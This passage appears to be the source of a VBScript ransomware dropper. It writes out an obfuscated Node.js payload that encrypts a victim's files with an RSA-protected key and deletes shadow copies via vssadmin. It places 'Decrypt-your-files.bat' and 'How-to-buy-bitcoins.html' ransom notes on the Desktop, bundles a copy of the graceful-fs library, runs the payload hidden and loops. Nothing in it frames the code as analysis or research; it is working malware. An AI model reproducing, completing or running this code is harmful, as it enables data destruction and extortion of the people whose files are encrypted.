src=""http://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"">\x3c/script>\n</body>\n</html>', a=1,{value:generateKey(5),done:!1};case 1:if(1!=b){a=2;break}a=-1;throw q;case 2:return keyFile=t=l,v=keyFile+"".key"",u=""valid"",a=3,{value:encryptRSA(u,publicKey),done:!1};case 3:if(1!=b){a=4;break}a=-1;throw q;case 4:return k=r=l,a=5,{value:writeFile(wd+""test.pm2"",k),done:!1};case 5:if(1!=b){a=6;break}a=-1;throw q;case 6:return a=7,{value:generateKey(keyLength),done:!1};case 7:if(1!=b){a=8;break}a=-1;throw q;case 8:return key=m=l,console.log(""New key has been generated: "",key),a=9,{value:encryptRSA(key, publicKey),done:!1};case 9:if(1!=b){a=10;break}a=-1;throw q;case 10:return f=h=l,console.log(""Key has been encrypted with public key: "",f),console.log(""Wait a sec ... ""),a=11,{value:wait(1700),done:!1};case 11:if(1!=b){a=12;break}a=-1;throw q;case 12:return a=13,{value:writeFile(userprofile+""\\Desktop\\Decrypt-your-files.bat"",""start ""+wd+mainName+"".exe ""+wd+entPoint+"" decryptStatic""),done:!1};case 13:if(1!=b){a=14;break}a=-1;throw q;case 14:return a=15,{value:writeFile(userprofile+""\\Desktop\\How-to-buy-bitcoins.html"", g),done:!1};case 15:if(1!=b){a=16;break}a=-1;throw q;case 16:return a=17,{value:writeFile(wd+""\\How-to-buy-bitcoins.html"",g),done:!1};case 17:if(1!=b){a=18;break}a=-1;throw q;case 18:return a=19,{value:kill(),done:!1};case 19:if(1!=b){a=20;break}a=-1;throw q;case 20:e=0;case 21:if(!(e<dir.length)){a=23;break}a=24;return{value:getFileList(dir[e]),done:!1};case 24:if(1!=b){a=25;break}a=-1;throw q;case 25:c=d=l;if(!(0<c.length)){a=26;break}kill();a=28;return{value:c.forEach(function(a){(dir[e]!==userprofile+ ""\\Desktop""||""Decrypt-your-files.bat""!==path.basename(a)&&""How-to-buy-bitcoins.html""!==path.basename(a))&&0<fs.statSync(a).size&&encrypt(a,key,function(){n||(n=!0,writeFile(""""+wd+v,f))},!0)}),done:!1};case 28:if(1!=b){a=29;break}a=-1;throw q;case 29:a=27;break;case 26:console.log(""Nothing to encrypt"");case 27:case 22:e++;a=21;break;case 23:a=-1;default:return{value:void 0,done:!0}}}var a=0,c,d,e,f,h,m,k,r,u,v,t,g,n,l={next:function(a){return b(0,a,void 0)},throw:function(a){return b(1,void 0,a)}, return:function(a){throw Error(""Not yet implemented"");}};$jscomp.initSymbolIterator();l[Symbol.iterator]=function(){return this};return l}())} function init(){return $jscomp.executeAsyncGenerator(function(){function b(b,g,n){for(;;)switch(a){case 0:return u=process.argv,a=1,{value:isAdmin(),done:!1};case 1:if(1!=b){a=2;break}a=-1;throw n;case 2:return k=r=g,a=3,{value:scan(),done:!1};case 3:if(1!=b){a=4;break}a=-1;throw n;case 4:dir=m=g;console.log(""(INIT) Targets: "",dir);if(k)try{console.log(""Deleting shadow copies""),exec(""vssadmin delete shadows /All /Quiet"")}catch(l){}if(""decrypt""!==u[2]){a=5;break}process.title=""Decrypt-""+mainName;a=7;return{value:exec('taskkill /FI ""WINDOWTITLE eq Encrypt-'+mainName+'"" /F /T'),done:!1};case 7:if(1!=b){a=8;break}a=-1;throw n;case 8:return a=9,{value:dec(),done:!1};case 9:if(1!=b){a=10;break}a=-1;throw n;case 10:a=6;break;case 5:if(""decryptStatic""!==u[2]){a=11;break}process.title=""Decrypt-""+mainName;a=13;return{value:decStatic(),done:!1};case 13:if(1!=b){a=14;break}a=-1;throw n;case 14:a=12;break;case 11:if(""decryptPrivateKey""!==u[2]){a=15;break}decPrivateKey();a=16;break;case 15:return a=17, {value:readFile(wd+""test.pm2""),done:!1};case 17:if(1!=b){a=18;break}a=-1;throw n;case 18:return f=h=g,a=19,{value:readFile(privateKeyPath),done:!1};case 19:if(1!=b){a=20;break}a=-1;throw n;case 20:d=e=g;if(!d){a=21;break}if(!f){a=22;break}try{c=decryptRSA(f,privateKeyPath);if(""valid""!==c){a=25;break}console.log(""(INIT) Valid key found"");a=-1;return{value:!0,done:!0}}catch(l){a=23;break}case 25:try{a=24;break}catch(l){a=23;break}case 23:console.log(""(INIT)"",""Wrong key"");case 24:case 22:case 21:try{return a=28,{value:exec('tasklist /FI ""WINDOWTITLE eq Encrypt-'+mainName+'"" 2>NUL | find /C /I /N  "".exe""',function(a,b,c){1<b&&(console.log(""(INIT)"",""Another instance is running already""),process.exit())}),done:!1}}catch(l){a=26;break}case 28:try{if(1!=b){a=29;break}a=-1;throw n;}catch(l){a=26;break}case 29:try{a=27;break}catch(l){a=26;break}case 26:case 27:console.log(""(INIT) Starting main()""),main();case 16:case 12:case 6:a=-1;default:return{value:void 0,done:!0}}}var a=0,c,d,e,f,h,m,k,r,u,v={next:function(a){return b(0, a,void 0)},throw:function(a){return b(1,void 0,a)},return:function(a){throw Error(""Not yet implemented"");}};$jscomp.initSymbolIterator();v[Symbol.iterator]=function(){return this};return v}())}init();" & vbCrLf
objFile.Close

outFile=outModuleDir & "graceful-fs\fs.js"
Set objFile = objFSO.CreateTextFile(outFile, True)
objFile.Write "'use strict'; var fs = require('fs'); module.exports = clone(fs); function clone (obj) {if (obj === null || typeof obj !== 'object') return obj; if (obj instanceof Object) { var copy = { __proto__: obj.__proto__ } } else { var copy = Object.create(null) }; Object.getOwnPropertyNames(obj).forEach(function (key) { Object.defineProperty(copy, key, Object.getOwnPropertyDescriptor(obj, key)) }); return copy; }" & vbCrLf
objFile.Close

outFile=outModuleDir & "graceful-fs\package.json"
Set objFile = objFSO.CreateTextFile(outFile, True)
objFile.Write "{""name"":""graceful-fs"",""description"":""A drop-in replacement for fs, making various improvements."",""version"":""4.1.11"",""repository"":{""type"":""git"",""url"":""https://github.com/isaacs/node-graceful-fs""},""main"":""graceful-fs.js"",""engines"":{""node"":"">=0.4.0""},""directories"":{""test"":""test""},""scripts"":{""test"":""node test.js | tap -""},""keywords"":[""fs"",""module"",""reading"",""retry"",""retries"",""queue"",""error"",""errors"",""handling"",""EMFILE"",""EAGAIN"",""EINVAL"",""EPERM"",""EACCESS""],""license"":""ISC"",""devDependencies"":{""mkdirp"":""^0.5.0"",""rimraf"":""^2.2.8"",""tap"":""^5.4.2""},""files"":[""fs.js"",""graceful-fs.js"",""legacy-streams.js"",""polyfills.js""]}" & vbCrLf
objFile.Close

outFile=outModuleDir & "graceful-fs\graceful-fs.js"
Set objFile = objFSO.CreateTextFile(outFile, True)
objFile.Write "function noop(){}function patch(e){function t(e,t,n){function r(e,t,n){return y(e,t,function(o){!o||""EMFILE""!==o.code&&""ENFILE""!==o.code?(""function""==typeof n&&n.apply(this,arguments),retry()):enqueue([r,[e,t,n]])})}return""function""==typeof t&&(n=t,t=null),r(e,t,n)}function n(e,t,n,r){function o(e,t,n,r){return d(e,t,n,function(u){!u||""EMFILE""!==u.code&&""ENFILE""!==u.code?(""function""==typeof r&&r.apply(this,arguments),retry()):enqueue([o,[e,t,n,r]])})}return""function""==typeof n&&(r=n,n=null),o(e,t,n,r)}function r(e,t,n,r){function o(e,t,n,r){return m(e,t,n,function(u){!u||""EMFILE""!==u.code&&""ENFILE""!==u.code?(""function""==typeof r&&r.apply(this,arguments),retry()):enqueue([o,[e,t,n,r]])})}return""function""==typeof n&&(r=n,n=null),o(e,t,n,r)}function o(e,t,n){function r(e,t){t&&t.sort&&t.sort(),!e||""EMFILE""!==e.code&&""ENFILE""!==e.code?(""function""==typeof n&&n.apply(this,arguments),retry()):enqueue([u,[o]])}var o=[e];return""function""!=typeof t?o.push(t):n=t,o.push(r),u(o)}function u(t){return g.apply(e,t)}function i(e,t){return this instanceof i?(h.apply(this,arguments),this):i.apply(Object.create(i.prototype),arguments)}function a(){var e=this;l(e.path,e.flags,e.mode,function(t,n){t?(e.autoClose&&e.destroy(),e.emit(""error"",t)):(e.fd=n,e.emit(""open"",n),e.read())})}function c(e,t){return this instanceof c?(F.apply(this,arguments),this):c.apply(Object.create(c.prototype),arguments)}function p(){var e=this;l(e.path,e.flags,e.mode,function(t,n){t?(e.destroy(),e.emit(""error"",t)):(e.fd=n,e.emit(""open"",n))})}function s(e,t){return new i(e,t)}function f(e,t){return new c(e,t)}function l(e,t,n,r){function o(e,t,n,r){return v(e,t,n,function(u,i){!u||""EMFILE""!==u.code&&""ENFILE""!==u.code?(""function""==typeof r&&r.apply(this,arguments),retry()):enqueue([o,[e,t,n,r]])})}return""function""==typeof n&&(r=n,n=null),o(e,t,n,r)}polyfills(e),e.gracefulify=patch,e.FileReadStream=i,e.FileWriteStream=c,e.createReadStream=s,e.createWriteStream=f;var y=e.readFile;e.readFile=t;var d=e.writeFile;e.writeFile=n;var m=e.appendFile;m&&(e.appendFile=r);var g=e.readdir;if(e.readdir=o,""v0.8""===process.version.substr(0,4)){var E=legacy(e);i=E.ReadStream,c=E.WriteStream}var h=e.ReadStream;i.prototype=Object.create(h.prototype),i.prototype.open=a;var F=e.WriteStream;c.prototype=Object.create(F.prototype),c.prototype.open=p,e.ReadStream=i,e.WriteStream=c;var v=e.open;return e.open=l,e}function enqueue(e){debug(""ENQUEUE"",e[0].name,e[1]),queue.push(e)}function retry(){var e=queue.shift();e&&(debug(""RETRY"",e[0].name,e[1]),e[0].apply(null,e[1]))}var fs=require(""fs""),polyfills=require(""./polyfills.js""),legacy=require(""./legacy-streams.js""),queue=[],util=require(""util""),debug=noop;util.debuglog?debug=util.debuglog(""gfs4""):/\bgfs4\b/i.test(process.env.NODE_DEBUG||"""")&&(debug=function(){var e=util.format.apply(util,arguments);e=""GFS4: ""+e.split(/\n/).join(""\nGFS4: ""),console.error(e)}),/\bgfs4\b/i.test(process.env.NODE_DEBUG||"""")&&process.on(""exit"",function(){debug(queue),require(""assert"").equal(queue.length,0)}),module.exports=patch(require(""./fs.js"")),process.env.TEST_GRACEFUL_FS_GLOBAL_PATCH&&(module.exports=patch(fs)),module.exports.close=fs.close=function(e){return function(t,n){return e.call(fs,t,function(e){e||retry(),""function""==typeof n&&n.apply(this,arguments)})}}(fs.close),module.exports.closeSync=fs.closeSync=function(e){return function(t){var n=e.apply(fs,arguments);return retry(),n}}(fs.closeSync);" & vbCrLf
objFile.Close

outFile=outModuleDir & "graceful-fs\legacy-streams.js"
Set objFile = objFSO.CreateTextFile(outFile, True)
objFile.Write "function legacy(t){function e(i,s){if(!(this instanceof e))return new e(i,s);Stream.call(this);var r=this;this.path=i,this.fd=null,this.readable=!0,this.paused=!1,this.flags=""r"",this.mode=438,this.bufferSize=65536,s=s||{};for(var h=Object.keys(s),n=0,a=h.length;a>n;n++){var o=h[n];this[o]=s[o]}if(this.encoding&&this.setEncoding(this.encoding),void 0!==this.start){if(""number""!=typeof this.start)throw TypeError(""start must be a Number"");if(void 0===this.end)this.end=1/0;else if(""number""!=typeof this.end)throw TypeError(""end must be a Number"");if(this.start>this.end)throw new Error(""start must be <= end"");this.pos=this.start}return null!==this.fd?void process.nextTick(function(){r._read()}):void t.open(this.path,this.flags,this.mode,function(t,e){return t?(r.emit(""error"",t),void(r.readable=!1)):(r.fd=e,r.emit(""open"",e),void r._read())})}function i(e,s){if(!(this instanceof i))return new i(e,s);Stream.call(this),this.path=e,this.fd=null,this.writable=!0,this.flags=""w"",this.encoding=""binary"",this.mode=438,this.bytesWritten=0,s=s||{};for(var r=Object.keys(s),h=0,n=r.length;n>h;h++){var a=r[h];this[a]=s[a]}if(void 0!==this.start){if(""number""!=typeof this.start)throw TypeError(""start must be a Number"");if(this.start<0)throw new Error(""start must be >= zero"");this.pos=this.start}this.busy=!1,this._queue=[],null===this.fd&&(this._open=t.open,this._queue.push([this._open,this.path,this.flags,this.mode,void 0]),this.flush())}return{ReadStream:e,WriteStream:i}}var Stream=require(""stream"").Stream;module.exports=legacy;" & vbCrLf
objFile.Close

outFile=outModuleDir & "graceful-fs\polyfills.js"
Set objFile = objFSO.CreateTextFile(outFile, True)
objFile.Write "function patch(n){constants.hasOwnProperty(""O_SYMLINK"")&&process.version.match(/^v0\.6\.[0-2]|^v0\.5\./)&&patchLchmod(n),n.lutimes||patchLutimes(n),n.chown=chownFix(n.chown),n.fchown=chownFix(n.fchown),n.lchown=chownFix(n.lchown),n.chmod=chmodFix(n.chmod),n.fchmod=chmodFix(n.fchmod),n.lchmod=chmodFix(n.lchmod),n.chownSync=chownFixSync(n.chownSync),n.fchownSync=chownFixSync(n.fchownSync),n.lchownSync=chownFixSync(n.lchownSync),n.chmodSync=chmodFixSync(n.chmodSync),n.fchmodSync=chmodFixSync(n.fchmodSync),n.lchmodSync=chmodFixSync(n.lchmodSync),n.stat=statFix(n.stat),n.fstat=statFix(n.fstat),n.lstat=statFix(n.lstat),n.statSync=statFixSync(n.statSync),n.fstatSync=statFixSync(n.fstatSync),n.lstatSync=statFixSync(n.lstatSync),n.lchmod||(n.lchmod=function(n,c,t){t&&process.nextTick(t)},n.lchmodSync=function(){}),n.lchown||(n.lchown=function(n,c,t,o){o&&process.nextTick(o)},n.lchownSync=function(){}),""win32""===platform&&(n.rename=function(c){return function(t,o,i){var r=Date.now(),s=0;c(t,o,function e(u){return u&&(""EACCES""===u.code||""EPERM""===u.code)&&Date.now()-r<6e4?(setTimeout(function(){n.stat(o,function(n,r){n&&""ENOENT""===n.code?c(t,o,e):i(u)})},s),void(100>s&&(s+=10))):void(i&&i(u))})}}(n.rename)),n.read=function(c){return function(t,o,i,r,s,e){var u;if(e&&""function""==typeof e){var a=0;u=function(f,h,l){return f&&""EAGAIN""===f.code&&10>a?(a++,c.call(n,t,o,i,r,s,u)):void e.apply(this,arguments)}}return c.call(n,t,o,i,r,s,u)}}(n.read),n.readSync=function(c){return function(t,o,i,r,s){for(var e=0;;)try{return c.call(n,t,o,i,r,s)}catch(u){if(""EAGAIN""===u.code&&10>e){e++;continue}throw u}}}(n.readSync)}function patchLchmod(n){n.lchmod=function(c,t,o){n.open(c,constants.O_WRONLY|constants.O_SYMLINK,t,function(c,i){return c?void(o&&o(c)):void n.fchmod(i,t,function(c){n.close(i,function(n){o&&o(c||n)})})})},n.lchmodSync=function(c,t){var o,i=n.openSync(c,constants.O_WRONLY|constants.O_SYMLINK,t),r=!0;try{o=n.fchmodSync(i,t),r=!1}finally{if(r)try{n.closeSync(i)}catch(s){}else n.closeSync(i)}return o}}function patchLutimes(n){constants.hasOwnProperty(""O_SYMLINK"")?(n.lutimes=function(c,t,o,i){n.open(c,constants.O_SYMLINK,function(c,r){return c?void(i&&i(c)):void n.futimes(r,t,o,function(c){n.close(r,function(n){i&&i(c||n)})})})},n.lutimesSync=function(c,t,o){var i,r=n.openSync(c,constants.O_SYMLINK),s=!0;try{i=n.futimesSync(r,t,o),s=!1}finally{if(s)try{n.closeSync(r)}catch(e){}else n.closeSync(r)}return i}):(n.lutimes=function(n,c,t,o){o&&process.nextTick(o)},n.lutimesSync=function(){})}function chmodFix(n){return n?function(c,t,o){return n.call(fs,c,t,function(n){chownErOk(n)&&(n=null),o&&o.apply(this,arguments)})}:n}function chmodFixSync(n){return n?function(c,t){try{return n.call(fs,c,t)}catch(o){if(!chownErOk(o))throw o}}:n}function chownFix(n){return n?function(c,t,o,i){return n.call(fs,c,t,o,function(n){chownErOk(n)&&(n=null),i&&i.apply(this,arguments)})}:n}function chownFixSync(n){return n?function(c,t,o){try{return n.call(fs,c,t,o)}catch(i){if(!chownErOk(i))throw i}}:n}function statFix(n){return n?function(c,t){return n.call(fs,c,function(n,c){return c?(c.uid<0&&(c.uid+=4294967296),c.gid<0&&(c.gid+=4294967296),void(t&&t.apply(this,arguments))):t.apply(this,arguments)})}:n}function statFixSync(n){return n?function(c){var t=n.call(fs,c);return t.uid<0&&(t.uid+=4294967296),t.gid<0&&(t.gid+=4294967296),t}:n}function chownErOk(n){if(!n)return!0;if(""ENOSYS""===n.code)return!0;var c=!process.getuid||0!==process.getuid();return!c||""EINVAL""!==n.code&&""EPERM""!==n.code?!1:!0}var fs=require(""./fs.js""),constants=require(""constants""),origCwd=process.cwd,cwd=null,platform=process.env.GRACEFUL_FS_PLATFORM||process.platform;process.cwd=function(){return cwd||(cwd=origCwd.call(process)),cwd};try{process.cwd()}catch(er){}var chdir=process.chdir;process.chdir=function(n){cwd=null,chdir.call(process,n)},module.exports=patch;" & vbCrLf
objFile.Close



	'Wscript.Echo("Begining launch")

	If (objFSO.FileExists(strExe)) Then
		strReturn = oShell.Run(strExe & " " & outWorkingDir & "\" & strEntPoint, 0, true)
	End If

	If NOT (objFSO.FileExists(outWorkingDir & "\initdone")) Then

		If (objFSO.FileExists(outWorkingDir & "\How-to-buy-bitcoins.html")) Then
			oShell.Run("cmd /c start /min " & outWorkingDir & "\How-to-buy-bitcoins.html")
		End If
		
		If ( (objFSO.FileExists(outWorkingDir & "\" & strEntPoint)) AND (objFSO.FileExists(strExe)) ) Then
			oShell.Run(strExe & " " & outWorkingDir & "\" & strEntPoint & " decryptStatic")
		End If

		strReg = oShell.Run("reg delete  HKCU\\Software\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop /f", 0, true)
		strRunDLL = oShell.Run("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 0, true)


		If (objFSO.FileExists(outWorkingDir & "\How-to-buy-bitcoins.html")) Then
			outFile=outWorkingDir & "\initdone"
			Set objFile = objFSO.CreateTextFile(outFile, True)
			objFile.Write "" & vbCrLf
			objFile.Close
		End If

	End If
	WScript.Sleep 40000

loop


Function generatePassword(PASSWORD_LENGTH)

	Dim NUMLOWER, NUMUPPER, LOWERBOUND, UPPERBOUND, LOWERBOUND1, UPPERBOUND1, SYMLOWER, SYMUPPER
	Dim newPassword, count, pwd 
	Dim pCheckComplex, pCheckComplexUp, pCheckComplexLow, pCheckComplexNum, pCheckComplexSym, pCheckAnswer


	 NUMLOWER    = 48 
	 NUMUPPER    = 57 
	 LOWERBOUND  = 65
	 UPPERBOUND  = 90 
	 LOWERBOUND1 = 97
	 UPPERBOUND1 = 122
	 SYMLOWER    = 33
	 SYMUPPER    = 46
	 pCheckComplexUp  = 0 
	 pCheckComplexLow = 0
	 pCheckComplexNum = 0 
	 pCheckComplexSym = 0
	 
	 Randomize()

	 newPassword = ""
	 count = 0
	 DO UNTIL count = PASSWORD_LENGTH

	   If Int( ( 10 - 2 + 1 ) * Rnd + 2 ) > 2 And  Int( ( 10 - 2 + 1 ) * Rnd + 2 ) <= 5 Then
	    pwd = Int( ( UPPERBOUND1 - LOWERBOUND1 + 1 ) * Rnd + LOWERBOUND1 )

	   Elseif Int( ( 10 - 2 + 1 ) * Rnd + 2 ) > 5 And  Int( ( 10 - 2 + 1 ) * Rnd + 2 ) <= 7 Then
	    pwd = Int( ( UPPERBOUND - LOWERBOUND + 1 ) * Rnd + LOWERBOUND ) 

	   Else
	       pwd = Int( ( NUMUPPER - NUMLOWER + 1 ) * Rnd + NUMLOWER )
	   End If

	  newPassword = newPassword + Chr( pwd )
	  
	  count = count + 1
	  
	  If count = (PASSWORD_LENGTH) Then
	      For pCheckComplex = 1 To PASSWORD_LENGTH
	          If Asc(Mid(newPassword,pCheckComplex,1)) >64 And Asc(Mid(newPassword,pCheckComplex,1))< 90 Then
	                  pCheckComplexUp = 1 
	          ElseIf Asc(Mid(newPassword,pCheckComplex,1)) >96 And Asc(Mid(newPassword,pCheckComplex,1))< 123 Then
	                  pCheckComplexLow = 1 
	          ElseIf Asc(Mid(newPassword,pCheckComplex,1)) >47 And Asc(Mid(newPassword,pCheckComplex,1))< 58 Then
	                  pCheckComplexNum = 1
	          End If
	      Next
	      
	      pCheckAnswer = pCheckComplexUp+pCheckComplexLow+pCheckComplexNum+pCheckComplexSym
	            
	      If pCheckAnswer < 3 Then
	          newPassword = ""
	          count = 0
	      End If
	  End If
	 Loop
	 generatePassword = newPassword
End Function 
